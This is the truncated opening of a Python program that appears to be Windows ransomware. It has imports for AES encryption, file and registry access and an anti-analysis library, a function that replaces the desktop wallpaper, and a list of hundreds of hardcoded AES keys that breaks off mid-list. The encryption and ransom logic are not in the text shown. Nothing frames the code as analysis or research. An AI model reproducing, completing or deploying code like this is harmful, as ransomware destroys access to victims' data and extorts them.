import os
import sys
import struct
from Crypto.Cipher import AES
import string
import userpaths
import win32file
import guardshield
import subprocess
import time
import threading
import ctypes
import winreg as reg
import tkinter as tk
from Crypto.Random import get_random_bytes
import Crypto.Random
import psutil
import base64

def set_wallpaper(path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)

AES_KEYS = [
    b'0cb2d16cd8f075a0f18edd39dac10d3e',
    b'd58de82f2aa7fb3243d939e01db9d974',
    b'1bca16ec1107b5fb85351c26c2f3f951',
    b'39e66e5fb05a55689cd2be8400e69102',
    b'4ac727e5f9e0dd01f2ba0bd3f1c05d49',
    b'868b4097c6d535603f48ff0322745760',
    b'7df7d0f5085dffe3342770875306c3e8',
    b'0d40d3ac0d87e01405520b7aa9455173',
    b'833c6268d2cabc6deb2c7ce91444f4fb',
    b'd6e2b4d38afa52ac2acf9242b5d80619',
    b'1203f15c8f170399b3167677f95ea52f',
    b'7d6d3a8b0f3a331b97710a32ec319f1c',
    b'bf744356188255033f3fe01bb36f2220',
    b'dbf0d10b22416cd141b12d725ab5e6ee',
    b'522ea34bdf45dc6c48a0b24e60d38759',
    b'8d4bc1682e4fb85c723961e94a4dd328',
    b'8d9976e54f12e3847cb413f2ab4a9253',
    b'1283467699fdc8fc597c14c408df8093',
    b'a3d29395aabc63bbb4860a19d9aaaf12',
    b'4cd129ee14dc191fe4626c15f82762de',
    b'6d06ac32587832cadedd358f5c77b703',
    b'7df8d09d9754efbafa7ff7c312fcb13c',
    b'0d4ee2b3b8b259df6802ef93493beaee',
    b'c61c413f5f205c1242663452b867c6ac',
    b'40941e5b38d58093bf9e4323fd01176f',
    b'8ae51ae0a1dc3b9a3f92756bd0c13a29',
    b'3d12e1e868a77b4d3f9f84857899d41a',
    b'e51776688440128504753f18a00d589f',
    b'd61d04a101ab449c4aa5bdd1fc94c57b',
    b'a13aa2bc018e492c0ae8b74d4fd83b44',
    b'2cac1732bce05c598c8cf1ab47ae3223',
    b'4b5344294231b855981069e952b01b32',
    b'c09e6497d2b0b8995e3533bdf250f9f3',
    b'e05fdd08388fc03cd80800011eeb2ae7',
    b'c0cfd566c25b7409ff08d336f888c50d',
    b'6f481415203802016f4ff66bf41f79ee',
    b'6c4f994367615e786cb5edeccd8c65b8',
    b'f5e88bd025bfea55fc929d6088ce3fd9',
    b'01de43f11253a4d2290b318f20d9fb81',
    b'341d2000e258ed393a52fcfec63b4c7f',
    b'399c499952a5ccab929210fe19793e40',
    b'a3542b670dec696af4987bb9af1265b5',
    b'f079cfa7fc409fc6685df58c81882476',
    b'a929bda6b5db89ed0d5b2a05cef68a0e',
    b'4e496381173bc4e4bf0e94dc6d4c04e8',
    b'bdefa72c7b6638b981d40da8b604cd71',
    b'9eaee964af3da82d5fbb9ed5862b5806',
    b'd18054fb57e0909acd2f3191c32234f5',
    b'b0fb96eb2a06c3858204400d81a74608',
    b'7fcd5bd7a31cdb42865357776e7364db',
    b'37b09628527986ffc557c1828c823dcb',
    b'aa0a840936f5ce25518739d24f8297a9',
    b'cca06a0c5cf23841942f05fbc2dca8ae',
    b'e58f52ba270a75ea8164436ebf555578',
    b'89e34ed8c52815276cdff151c7bfb9b4',
    b'd2384d106f40724f9bbfd7f35928ddaf',
    b'480a4f10fc3119198faac138cd263368',
    b'f5a7cf3f170e83ad60202165f79e19ab',
    b'2e3cf19e1192a88876bc53a30e6f622c',
    b'17e4fcbe7ea9103e6bcd4a8a8ebf63db',
    b'c8c8b57a991ba1236bd4c4474849bef6',
    b'f2be27773a613898486f4c3f68029e58',
    b'ff88767234bcf72a973f146f6152dee7',
    b'008409cdafdf45c0af27a4cd741372a3',
    b'64bc6e688e3e0cb1f493461bf56e98a1',
    b'5f8bedf42c2a2cfa6e068e39aaa0da06',
    b'5666acdd4508f520f32a53ca6af4a46c',
    b'84dc10513dc98be8577f1b9386e6383e',
    b'c379ac3b3b739e0af9503d0ec153497d',
    b'0e4bc8c2de4ef9361abbceda30086d39',
    b'4748e44995a8e6ad59fc2efaf582f3e3',
    b'b78091e86c0b98b999ebd59b80c32721',
    b'443df4ddf84282b6de517e5d2bf9ae89',
    b'c9cd66d37aba58e3d6693588a8a002d2',
    b'bd3c8cf653bae0a8dd3df9ff39437285',
    b'c99e8addbb4ec0d34a3fe25c65049419',
    b'6d4f9543e716629833c3b9ede0be5791',
    b'10f498723cc5668cc0c13b3077068bce',
    b'a440efa0040ce90b10aba2530fbfed15',
    b'ad9291e649089a27b9bfc7dbb1f1725b',
    b'cfe0ce7255186ac1687568dae4c5351d',
    b'b6b1ccde0ee094dd4d18a34076298e42',
    b'0fcb42368f6d318035c52b6aff008d5c',
    b'596e68a85ea5b855fb5003c5373354a5',
    b'011a8edd74669b4798fe0c92f7e15f6c',
    b'25388c35b7efb9dab5b95f4c34fcdab5',
    b'696bc6ceb501c54032ee8cec93c3878c',
    b'89cc249d52941d97e3b3451fa52e51f4',
    b'54fe7c1ae654ef798ec8c9e407464db5',
    b'f5f2d5446468f695c3ff68e387a9bfde',
    b'fdd48752a8dd645943265c9ae60809a9',
    b'6f40feb33aa36747044335c84072a41d',
    b'2246354883f1ef6938494faad389cea1',
    b'ac1e45fea1bb2cd45dd6bf6337dbc370',
    b'77ddb0b5d7f8797f9368df483b987081',
    b'0b3a5f0cc7b18a984a7e2b58d0f27a83',
    b'ab7a30761d2a64d2fccabd36b47f0bbc',
    b'ce5594499589d3aa4bdde6108d2169f4',
    b'bfa14976394ab28a3761c7d08009aebd',
    b'acf0b6401a36671b9e48d7a0bfbe7e5e',
    b'cd180a93c889d03e18a40547dd65ea1e',
    b'2c14960ef36af6a9163cee2997022622',
    b'730bba1e3e56912a1572e8f953a2db18',
    b'948f0f59d5a07846a4036d0be9955374',
    b'0545b71e86542dcec4c77257a9354bd3',
    b'81d6696e1c0336ad0d4457229c6ad3eb',
    b'70d515351bdfb8b179c0c378a4733e86',
    b'147aa0a2b21b03eafba0cf8301fff3ae',
    b'72986ea7159608a2740a9bc121030d21',
    b'dea45b72099f5070649ac3e421644058',
    b'5bf1436fe2ba4ea5ef05f8303f006a0e',
    b'e6b7a9e54d94f2515842799be438c536',
    b'd19f1c3a97e8ff27b169207a39a33cac',
    b'02013588f88de4dbadea368e8405d332',
    b'79aa3e2c01692bf2fdd77192973d2605',
    b'0836e782266e16aabb3d0bc911216681',
    b'd14b0f07c7418f1bc02600301b08bb3f',
    b'35df895a63f0047eaaef46974173f7af',
    b'6ccb3bc8b0861391417c6b10de3ca15b',
    b'e2e863c98b5b8c55ba754b549e153d99',
    b'821ce91e56990e126b678afc8755dda9',
    b'36736a434311ed4d0ea6b1201bc451dc',
    b'd996cdd33e9fecdc3a5d9409a6821529',
    b'ee18fda392cb3d13da304c78e2ce169e',
    b'cd97d965c6bdde3f3d8b47c37a9de70e',
    b'81b677b349350f9bec9bce64284b5ab8',
    b'84e3c06c3fefd9ce3af300f2638717b2',
    b'26777bdcf3a4f0c203e3d3c41123c421',
    b'bf2aeff1eb71d0e35384b305a78969fd',
    b'a29fe57632044de77f39ca68e49ea3ab',
    b'855bc4872923564ef1f7a886a998e9fd',
    b'383c96ee4a7dcefa65f1de3f97d6ad2e',
    b'69c21b5ae03977ec47fb8b53c11dfcb0',
    b'7662a2fd7ee0646d1c0748d11d7c1a71',
    b'b51fb1b8ab61edcc6be5ba1796904463',
    b'eb6c20e91662b97cef99ec952ded2e8e',
    b'2bae79a6ca8a29c57ef5c0295b45f6df',
    b'b6067a24ff6daba00c5897232e444bb6',
    b'365fcd926a82b35fcf137ff703888ba5',
    b'3f49a36be72ef4dbe80b2c4fb00bdbbb',
    b'4283e8a08f9a505bb5ea7822d5b7d5e5',
    b'73a1ed3fcbf90b1da13b2c6890f51c64',
    b'd7fdff751ef3600790566db9265f42e8',
    b'9cf4afd22b92a577b8a4366659cddad2',
    b'fa54e30b646fc9ad993ca01324138ccf',
    b'fbebe754681e9178d7a243770457fb37',
    b'fb4ab3e7166b0ddc956343451205d898',
    b'6eda1af49516d29a6b388200ef5623d1',
    b'247c616578f47d5e8f5cf0e9adcca01d',
    b'd8b8b160efe070743498c47fddd281b8',
    b'f4d2e4acb2d007599f5b1a42047b260e',
    b'4e4315b05aa9a715d3740bec83e884fd',
    b'517d9079f8a0d67095722ea25dabce8d',
    b'33c908b2c144ded97800e48c7b741408',
    b'1b205525f9f0c38e2560bdab06bbf115',
    b'1bcd36de7d558cc3f0cb10d4f54ab9fd',
    b'd4a93309bbd6b11d7d6db9c5fa091bf2',
    b'73a1f8d40e9081cec039346dfacf016f',
    b'1893f603b2ada64c437f3b3117bd62de',
    b'96c34f55ee93aeec4a7567e7dd7bf698',
    b'f24d0fc1cc43086c9caaef46821ff12c',
    b'dc4df41d390bacc63ae724025097f135',
    b'cb7f3a8c38110a452b84f9131fdc7b2b',
    b'e73ed854a727bb114c4e7051afcacbce',
    b'f337d79103f800b9858fbf32c610e098',
    b'43af59cb27073963451b172367808b62',
    b'cb50e7b85e01116049a0a2d049fa96ff',
    b'017e9c5dadc86070949dc84b6eddf6ca',
    b'944f62cbb85e3f3afe5f368f871a017b',
    b'8d492b9302fe8af9542e63b6a3ac9a26',
    b'a7b1a271cf6094b9dc7cbf3d8392220c',
    b'63590a962b98a346fc0bcbcad0b70a53',
    b'd170a3f4ef66729790cbf47fd210bae6',
    b'10423a8b9a77046860a0ebe248e01edf',
    b'168e29aed3ceab24ac14193b4796296b',
    b'b21a0352eedd55bc2e2c26bf306f2e8e',
    b'f7d8fcbc257be0b7ca20373ee298d014',
    b'12ddacb8f3480284bb9b045acb9d927e',
    b'd22ab550f8b504bdb3efea38f5b5bcf8',
    b'80bcf78463c82426623c639c847b2929',
    b'952fb0e1fe067eabeadaad66d5b48789',
    b'64ffb7242f75f70eff5cdc5885f6a3b0',
    b'92cd2e4589acf13dcb545f8356273ba9',
    b'53ea00f1f387a9c6b88bac17fe0f525c',
    b'c05ae245484c74edae2314e23b658bcc',
    b'c43f241fab50535808e1cb1497714a31',
    b'a666949f2f727407682d37941ae66390',
    b'7ece55161e479fadf1cf99909f2cb1be',
    b'9fd7367b7adf2fbad86fb45ba914d18a',
    b'ec07910e69a07b4c5c25168e0860b096',
    b'2b2ff2f0465bb8504035ca86aa61fda8',
    b'21c24709b363ae2b5f3fc96bad4c5020',
    b'4b7fba138e78fe72b075d1d769e5c8bd',
    b'18e7f89247abcba261439b01b66c0f1e',
    b'69c72be4a9ecdacecdec8941c4799f17',
    b'd63c53ae3fbeb73ed97bd474cd801708',
    b'fd1d751836b2d4a61d8f103964316bed',
    b'8c69a1e13e7c48071056bacdca47042e',
    b'4f68137e76da5f344ed3aea208bf2d37',
    b'5a926b7b1b41a3d8ddf11689be1787f6',
    b'abf3bd415ac4c9b0171fb4cf0998782e',
    b'92776948db0795b1a7fb9eb494828f8a',
    b'5019fe444257531abd324a876f87cf1c',
    b'7e64d81e271be87b28a749f60b13ce45',
    b'eb93f519010366c439af443dbd5db086',
    b'c433bc9c36d232b92077be8e3ce06641',
    b'aceda38ef405313009d330a0c95d5bf2',
    b'f3d78ae5b2bd6b9f8dd8ef69e789a78d',
    b'3e54bcf2d6d4ec88b2da606c2c0adbb4',
    b'efde4ebbf7dbdf2bc13c8a5b138d4d8f',
    b'b2f190451ad0720c3b417c3f3e066b6a',
    b'42ae3f271c2c84012772a5e545c80a95',
    b'1bfc0f035a235e1c187f28e9d04edd76',
    b'45548e29010ad03272918de61c3f2844',
    b'1ea4d8ace80cc3eff4d0d7937b0ce3e4',
    b'5045a7419b1b9816470db3e04146732e',
    b'5ae223451c80333a4a712449cabcd4ee',
    b'd87459b6a965bf5e663345b9a96376bb',
    b'5435cafd0efa4895b7521c8df40b56bd',
    b'aa73e605c0addf00b5eeb94d0fcbb671',
    b'fb47d48033bb3323952593ac7ade61cb',
    b'0e7bdb1c87db4e2eb3641163eb658801',
    b'5a2eae86664856a2101a2e67b0b5acdd',
    b'e5c0e95a89fef08cc3289457f0aeb453',
    b'1107ef60de48b8d3da50f2ab25a052e0',
    b'738c0efe0bea12ed3d52a54a14af1b61',
    b'ef652cf75482ffdabc0823e3fc733129',
    b'ae0b64eb169b6a5541ee4b9d8fa3b198',
    b'6711b803833ed732c5d8f311d56aa320',
    b'92b237cefa19f9ba62b157df906e9b6f',
    b'756168d3daf62ca9712a0973e21061b4',
    b'77f192028c93fd60c5d934b8bfca75d2',
    b'aee6589863f7bbe50c024b7fc5c902cc',
    b'a9c608f68d63a84ac091dbad24bc49e6',
    b'bc969c5f9f4a22151bcfc13a61f75361',
    b'eb279cc7247c2178ec391e211a52dd18',
    b'a991ad7c5f5285f182f4e474422747b5',
    b'5e65c9bb1e0c9e6c8c8c6e4c5d92595e',
    b'5313ba26075dc47d4b5ac55ab6561c70',
    b'a4b908d1aec4b0e7d959b39c4b995430',
    b'600f21f24e9cd960b8c98e30a61c2843',
    b'eca3a47fbb1db319e65c0aa251760dff',
    b'3ca6b9497c5fbad29f46982d17b6d9e6',
    b'd0f712c9b6ddb4c04f3dcc41bb26928d',
    b'19f284a2333a93c1eac9b75418f9f7df',
    b'b95e819005a05c190c009e434341824e',
    b'da59dd7ff2cbf5783ee93194793ffc4e',
    b'8e5a63b78de4c9dd3f840fbb0564dd59',
    b'683e8d4249ceb9fe1fc4fb7654c200ff',
    b'28edc435e9f1392b18b6b644f4666cc9',
    b'69932e6c69d70eabddbb61156924f739',
    b'88f1172bcbc78d4420ab1762e94029ee',
    b'80c1e836e1b1090def29b7f4d18e3177',
    b'751fbcf189d76bab97e4216a4f421f0a',
    b'4ec56c4fdcf7534b8eb4c92b42e8021e',
    b'09075ebb580571b8e590c3de9597d992',
    b'c923b5bf495b4a41879cf467dc867ce7',
    b'be97abf3f94353b9b92aa0ed92cdcd8a',
    b'c120f3fcb4e6c372effdd6baa2d5e623',
    b'4feb962fc87dc949a3010a09f2120732',
    b'718bec997b991eb3194d6464f3669ba5',
    b'94ece3b267a5e3e8abf8ceeeb9566fbd',
    b'2401e4b498a521355f6a16ed1ff7ea69',
    b'0fa36c5861b267b2178a5822571916c9',
    b'328eaeb47c4b8bf8b1d921214133b288',
    b'5382e7685d40e5423175a1857f333629',
    b'ab6fd08e19b0517fa60a02ca327cf802',
    b'b405683825f5a8ffd802072ed54705f6',
    b'a9a7f39d402936fd207254c0ec60f1cc',
    b'3cf920ea4a72e18383a9d2aecc93f8cd',
    b'9766fe619903afb07f6d014f3c6e8233',
    b'6b101937d1977147075633e825bc3741',
    b'46e8885e584ca71cc2ea775169233ccb',
    b'681eb79198799cfc65f95cfedf1d7b5e',
    b'643425735037a573d1f42d9ad244d72c',
    b'70e6c5f568b95ba7bf1f747d83d5908f',
    b'17d8edd1d59f26d06f0fda6e4b01acf0',
    b'1616191558abbaf5b68c4901f61a8db1',
    b'6e158e2a8285f38721ee75803e6d3894',
    b'cc00971a23736ba43484e8ddefe2fffb',
    b'c6413dcb2d7cb513cba11b3a8aa8cc99',
    b'1ce67674e9e115bc7dbb0a7c9c21e354',
    b'7c35b2921af60c7d19320db9cd84aca8',
    b'8f2344fa27e20d7b33ada941d562bbd7',
    b'1ab737498fe00087db6b25fcafb78b50',
    b'89e39d9bd0e40703722a0c507dc9de0d',
    b'3f0a8ff80a529cff99089b0d29b1cd7d',
    b'e25bfa389ca6a6b9f98068bcf46aebc9',
    b'b9a067d5afd5420c89be74ccce222173',
    b'92efee06918c8a418f0f16f1c5d76a47',
    b'49d442ccf5a5f8c9c013eaa8b3d84fa4',
    b'4b20a4a8a2bc37129c8ecb7f22938438',
    b'd285bf1f24cbb4e43a819719347f949c',
    b'cbf49773b3b3ef970e32e37c93ab01fb',
    b'd9bc52b215d09fe02fcedd3418fb99bf',
    b'6ad7b3fc268d1bd30e327e0930f33061',
    b'797520e67a52ead114a850906c6e702c',
    b'da7d410480cfba5ad9f3be92356f85d9',
    b'47f3002c012ecb9754284a78abd84be5',
    b'f24d24aa8f8709f6f7bae06279c23a42',
    b'e5e599b13c70065b8ee0184c5f95ceac',
    b'd3c35aedc7bdcaad10093d5ba94f0142',
    b'96429762aa1f336696367a6cff67cf94',
    b'905b2397742d22aa428a14136927503a',
    b'b31e2d46062aa79b406086c87e154c93',
    b'3e11058225f7263888d927eb78903beb',
    b'4b3f4b19219a2f93529dbc997ac1fa7b',
    b'82e813dffb4ebd870ea5f55e52d0257d',
    b'ffa6fc0760f1b08b27621804f6a6e6f1',
    b'b6e604dfe1a60f52cb1c04c5c9d8f4fc',
    b'4643f7f9fe864cc04f4442e92ed4df29',
    b'f9a98c18d5860bba1909f148f555bf83',
    b'd87e35d868617c6ef2afab950253b5a2',
    b'2349fa05ea8f91f0acc789283de1b953',
    b'4f8e4cb8de5ce4263ff00aa3fcf8d1eb',
    b'436ea74c531b0f686df53c782446ea66',
    b'23adf9c3414284aa7cb649b7e9702ba7',
    b'f5b1adbc1d12d9f44912e20d0272ea23',
    b'8f4a42e977436d9d49a7fa849884e6c6',
    b'134262807929c7c27a3d7ba7914671c3',
    b'ff9264f2b83c770ac22702ffa8b69f1d',
    b'f27567eb8e124f2fa0359f9419a219b5',
    b'146ed8e1fc32ec9532c5e91de78bd549',
    b'801b58e7c6cc33aabbc8f9a3f02afcef',
    b'40dcef0260324e730da16c7705db17b4',
    b'174951d2b0a847464928ab128f7fc132',
    b'6ba4d0cbff1275892e264d9ac85d95c2',
    b'5a8123c808cb722e9deac4c12231d031',
    b'6a0a93798c03f49089df426032a244a2',
    b'8ce02ec2bb974737dc2d6a6a17229de3',
    b'23226135af853254e6ae1f4ebe1c77ca',
    b'8eb17d0fff1a6e0d208c7e08932fc86f',
    b'171603fc9c20f6e02a4d58e63b22572a',
    b'792c31c1d5552141514327de5f81d7af',
    b'a5c8b8772052a35f41d1423c5fe5f4e4',
    b'ceadeec4cf4cdd7cd24fd22305fa746e',
    b'e52a35431709bbfae8ad162f6b97af85',
    b'e181f00406a7bdc692e07c4fb9497c64',
    b'0a0c39b12c3b0995cb12c6b6385f057c',
    b'e4d410930b65cf0b66b7940992874a46',
    b'5fca8e2671a0e9b7eea76ae082a29be6',
    b'1bb3847ee2d4116076767c56f1b970a1',
    b'9db39b5be7c7c99b25a984499238caf3',
    b'45af2fb533a8511f00cce498de659c71',
    b'3f98524dcf9b5f6a76dbe350dde28c73',
    b'e6ec889cf338b68478a4e69b4ee3d235',
    b'38d42d930a04d152c4ffb9c179231b0c',
    b'321a7cc049c577a864373eb04c68df22',
    b'413ee1ec5f920c3e2088d7b509c46861',
    b'9ffba1b9d6eb357288949815bca7c6f6',
    b'99390935c2b9d2ebd346a052457b3e67',
    b'c664d6d0d8d8399a9554eb93bc719be6',
    b'd55e18353584ee89a393349c5387ac2c',
    b'd0a93ecd6c5f5ebcb213782d2c353635',
    b'96088dc0f0f9ddbab44adcfe8f764934',
    b'0e03e857effd50b6b71681cef4d3f847',
    b'b66c1616a231240edd524b3ad67c207e',
    b'd714cdd5fd30da4f30b9d4852bf4d19b',
    b'1d46d2d773cbac2f96936e386b5e7693',
    b'6beacbb0417ce811f933193315ce6a39',
    b'9a82faea0727cc064343645a912bc350',
    b'ac465fb5955890240c1acafb7d5cc452',
    b'b3d3ceebd5321024a69a56adaa7b4e32',
    b'ec7b980d9df7655c2067ad90ba14025e',
    b'fb6b87c39be7a9bb697c1c8d9b5c9e8a',
    b'b2468e82c460bee0914744309027276d',
    b'5bebf405535d1c04e39317df663668b0',
    b'7c3cc074b04ac751a4cb3daceb39d0ea',
    b'4d288f8174b462f58477a0f5c50ea5fe',
    b'9854bbf6725891fcb4e7918b686d79ac',
    b'91d7e7a3b6de1d2246399f3fcfee322f',
    b'e6167cb1030da36d8aa893e342a0b3cc',
    b'43b1e24933443ed5f611c6e0a036471e',
    b'0c2095c6e005b3ba5f1638d208314a43',
    b'7894f5c0b91d5b6f9fbc8fce96c4ab59',
    b'7dea9d26f265d219bac409ef0e135a46',
    b'e93920dc0e0b23250a89786b67b02dd9',
    b'cccde5d94ef7b9d53a4d057d3d190775',
    b'03528c157d1f048bd5170bb41cd85953',
    b'2a8419250b650410adc251cbc5750915',
    b'ba979bbf1d833de85736fbbd87dc2625',
    b'3a79c4c8bb4615b23f02ad904100442f',
    b'4e7b98aabc48a2302b52e3d779594b7b',
    b'c68e1c027fcbadb4126fcd3d91b50a71',
    b'de8a3d39780b52f30b161366e5565a57',
    b'760f5aa0d077735744b3b527907fae15',
    b'892b214c35baf13caea81760ea0b9553',
    b'88d78bcb6435da321d7044ada4cf1fff',
    b'50981d99fd540d768be1218845ad7be0',
    b'1d3b89920187834afbe5c0bd0151327c',
    b'1e58097c3eee5fd70d027fb9160ebac1',
    b'269145d35f4a37769341dac81a76b0e3',
    b'8bfe0965237506436ac1dd057b1bfcd0',
    b'801b8478e746195ff87899ebfde2f253',
    b'a5abda28f721b9000c2660f4f393f647',
    b'29e073769e2c034ebfa9fff99c2e7427',
    b'bbbf4922b564a6dbddd8139c63d652fa',
    b'c6e38b62a30c5aef927529ee4f5d6736',
    b'03501bec2576475395bbd6ea09657e52',
    b'0944e41fe9853f2f2064b70e3b5ce928',
    b'1abc5915480d2b5f79dd260dc8e0ba27',
    b'5766fb9cad1f3147d3562f50ecce0e08',
    b'3702830ecc36498460223d0668f33fbb',
    b'2909084d000f2d32fb29dd2a6f65292d',
    b'53698b77f6b5d3f113cf9ae4108279f2',
    b'6a0c08b7de0f1f5b8de8042cbb18dda9',
    b'f89edb7d8fca1a4556a9d8d834988290',
    b'a285237b306ca6c75fb5ed8525712ad4',
    b'5d7008bc13585194777a25ab33710964',
    b'acab9262bc599d6d5ee4266ea59dc7d0',
    b'cf8a6ea4fa6d26580d88d7b8183ce4cd',
    b'e27d87bac093ca602d84d0e22b71592b',
    b'009387cd54e0a33776da576fbb966061',
    b'41255d98b45d64497b988e764dcda3e3',
    b'006f7833d3f405d33166298ecad67143',
    b'9767348e57624087b702876c0a6c15d2',
    b'7ca716c4a861f4397f225c383b454e50',
    b'5d4855c9b87247cccaa2b03f8d91b27d',
    b'35fa7a52b9c5dd6252d3c9da16950a41',
    b'cf14d87237f29759b21e3679a12f9b98',
    b'4fabcb1fe07ebd84444a57cb1d63d934',
    b'acec7494333baa23800ec511c7a6a9ed',
    b'790c2041ce43c5af21f78b8e35f1f06f',
    b'd55d73031ffcaa086102071f26052617',
    b'd760a2457a93640c11538fcb3137ff3d',
    b'1cc3343f72bf063e8f966f0aa95587cf',
    b'e3c1553ccaf3c367454499939e832e4c',
    b'9b3d4b1865c645d989fa336c224e78cb',
    b'50b08d3674a530c9e5cb80f01ac0d812',
    b'513dd9c325f5f63cc8f9f0edd94579ea',
    b'0a299c1522c6b6d92bfdcd8dc961ca38',
    b'53354adbc5d578ce7e52ff28b45e821e',
    b'b04ebf8d5ad5a0c6e61d9398bfbb7b2b',
    b'c75b253a15f50d4bb6d27c1afbc89c41',
    b'049ea4f1e8ee28ea72a2e737cf96ce55',
    b'ecc26f2b9ac27f215a15592f9fd1a385',
    b'a59b73e3f73ea026c7b235cbac4976b7',
    b'ee7674b1ed7662265ed6ff330a977302',
    b'ba31847315df6a058c05657691cfa1f8',
    b'b7df247ce6cad17458ff24c5d8442ce8',
    b'1a019ac7880c26ac2e7dd0061d236884',
    b'4a5fd004454e3d2dde1501cb0f650def',
    b'9ace211239ccff63f9c21673ba671b81',
    b'f1af1e866129d998a27f1556cb106fdf',
    b'368807da8dacc6defc270f936c077502',
    b'd1f5d7cd072f123b9e9fe1f078ad9006',
    b'3eae931bd1ad074a1bb8ffe5bceea0d4',
    b'6c34728842c8825d54f9c1a006c98b33',
    b'00415fae29dae389607de6d3a6ffc804',
    b'32a02649abe7a34ed724f418146dde34',
    b'93a64883922d17784947eda2527d20b0',
    b'713eab5b9f79b4112e1a302c73351112',
    b'6da0f53a10a40d4bf66c3bc257170320',
    b'feccd5a7220adbf8148ab9ed62ecc377',
    b'c19e6f05fecdf160b0d87823305d3446',
    b'a72c34f006b4dfd36fc353dea307cf75',
    b'e0f939bcabcdfaa65737b3cb4658662b',
    b'29bf2b5573c326ba77ea9f31ccab0b6b',
    b'1408c8b638be2233d823cd8251ff07dc',
    b'251983ecd33f5890608caa17994bdb6b',
    b'7052804b995b97371cb52ce4eae87b54',
    b'234d9d799ae3596f473d68901c65f50e',
    b'7111dd50f823e901d9bb409f4a21537c',
    b'133aec69771f6a5dfe3f2d6f81647b3a',
    b'e715b9de0f9babf0ed91fe1b87d26dc3',
    b'7e4c145c5d7d0c5e23df560d26f1cbbd',
    b'9babfaaca5e7994c3ef4136e3eaeb82c',
    b'f1c4ad4a4993ff9a961283a2eb878be3',
    b'274dac428fe56c4a73d93116faeb1ab2',
    b'1c12f63906d8b9487744b360a4049169',
    b'e5edca510eda610b05d730c770967051',
    b'ef129a2df27260a2303835baa58fa1b8',
    b'c6ba3092cc65b2282f40bfd17c4dbc73',
    b'd159c048cc61291b73038936066faf7f',
    b'8f50f0777a18f7ddcbe9e9ed143cc934',
    b'ec25adfbdd5e80f0e043e3ac37cec2b8',
    b'ce49cf2266b41408fe980906da65372a',
    b'ad8fcad860c74c255e5bafbfb24c28dd',
    b'057df8a8bc90475d08c48e7bc83724b2',
    b'4ecc541520a4f6a6306c47e79be156e1',
    b'9c7e1080b1ad8f5e73c8259e30b19400',
    b'4b1dd5aced4b194d9c3b6690096d6267',
    b'011423ec4e1642780714db082191e558',
    b'2d2c9f7b23a4f694f7aa68ccb4aa0900',
    b'03577a2e586b60c5b64e8bb61a65c9ce',
    b'643dc47ed6db0015f9b5980f5e957d40',
    b'f0d63dc96a11cb0661acd422fd0137f8',
    b'46a6fef42d3a52835bcd19c602d21aa6',
    b'7abd9eded1c75be3cc9f3047a54b37b4',
    b'963370740280ca53db380f52ef179f39',
    b'c1d7fbd75c1522edd0bd0d77ac23c59a',
    b'0f1bd46ed9af0366f121920fa0d064a6',
    b'cec98a9c711872aeaef97efff014e0e3',
    b'd314994eb93e0046106ae936d9bae392',
    b'a46f6a13d3c1bd97e0d4f86731757d5a',
    b'a16b1e0e3becd2212543865d917559f9',
    b'563a61a0d11d3e7207cb0a52b45720cc',
    b'aff9235414ee07809fa2b7411be3525c',
    b'3db9bc20f952e7eff23faa17946cbf76',
    b'059d736d7411a0e5a639570db98ccc41',
    b'3f16c4a42cf61ce48f5af5e56a69fa6d',
    b'1913b6cec741104253779f21ce4c2a32',
    b'365b202ad163b807df784c3f5794f3b3',
    b'dee1693321b38222da9a4bb7adfaad83',
    b'ef2e8463d6fe804f7456c0a9ace68b96',
    b'58d4489300f4486640e04c7d42aa8013',
    b'834218cd908237dc8e569ca11b41d8f9',
    b'e2609f5589a64ec610056c5a01f071aa',
    b'37bd803de37a8b632254b135daf0a9d3',
    b'b6e970fe72c1f876023cd5da31bdb1c3',
    b'2bac5848154f74e170c827aab19fa81c',
    b'c4c7947b86662109b04716f7b6d75a46',
    b'11be1751d64ec95c2427f8aee7d64ac0',
    b'bcbbf5f1808e2d2d05dc7f62b708961c',
    b'c29448fe198524bc0c85213798ea679f',
    b'0a9ed5496b7253bd859e34461df87197',
    b'a36e14a19e9125623e3a74014c2d4531',
    b'9f22ddb6a0c4b3d22cc336335641d21d',
    b'7f3192086c8a007b5d16ad6cf28cee39',
    b'ffba93de753efbf7fb244c221577cc2c',
    b'05544fa9ef7c30a064b4df9b6853870d',
    b'dde693c711459de2958381ef88d3f7a9',
    b'9a81f9db0b545f3c5cbadd2b5be992fb',
    b'bb3c6faef5b1121671d2406768ac6598',
    b'1c6e8220989cddabce82c91a90ee9dba',
    b'3f205faa56c585ab39b5ce2fdf60d209',
    b'e606e84d5b038b22b26db3f7b070a0c2',
    b'8fb107d0ac5bc9ce3a01f7b5a61eb0a4',
    b'c4ffbab6666998eb3fcb253481bd8b49',
    b'b5ab497435cc4f67bcf963cb0fe59688',
    b'e280ef0572a5ba6e9b1adeb1934c8120',
    b'898330f1cb4c0b60bcb78a892fe37634',
    b'365810a0ab483791d41b2f641d53cf23',
    b'621bd859b445c89f1d820ba6b09795dd',
    b'2e3095a7e276205f1339ed00f50eb764',
    b'33e135cfd950c9a3acc419e550109d78',
    b'b50d4a4fa8a9bf1bc240060881d05945',
    b'4ac5b6fac8dc9e4ab64bc8654b6b0cad',
    b'33d5110a164adbeaf6ab454d39cf8293',
    b'f97abc4add9ef669828b36ab6ecfb0b9',
    b'6e1cef2a4c4e963b5134ea9c50ec342e',
    b'44f3ca6b5cfd6167eae02ab3005eeab3',
    b'c276fd5fe3811f86ba1dc65701eb4267',
    b'5958e7d35e2066ad17588b25f83ceafe',
    b'62b2f5264aedf1e7f0acfbf4f104d77a',
    b'95e6eab106841ca77a055e2f1ee4a7ab',
    b'5a6d447719dea302bfef00a9245c29d9',
    b'0ba04a1b7bbbd13b081c1b554818b1a4',
    b'8541b77da5a4a4e25e64bcf9a614dcb1',
    b'b40ba34aca63af2d121078727ec6ab67',
    b'9981377b458830c255c5f32944036a90',
    b'cb2f22ca86abc23885fa4583ee887b3c',
    b'3eddba54a47c6e134fe49790af495cbd',
    b'23d9603ef5e2f37dae729a86c11ad121',
    b'8eede20e24548317f494f8fd485c5c9e',
    b'3a4990d35731bbb5b6b7a6e9959ad52e',
    b'51e0436e90c3ab94eeff74ed9abaddc7',
    b'3092c825e3bc7ba90cf1a70b72ea04f8',
    b'b4291a0114cc5ef42ab83ac56ca49b9e',
    b'eeb76585c7cfd40b9211f4603980fb6a',
    b'1e53b37abb4e38d81c8f33427d8cc401',
    b'0fc2e926fe24e56fd6012fd787a3e0a4',
    b'aaee7720dd8299c455c5f2ec2ad683d2',
    b'ff9d6509f308156a96907eaa95ca9388',
    b'fd922512b81a9abb4101a5ab90c369bc',
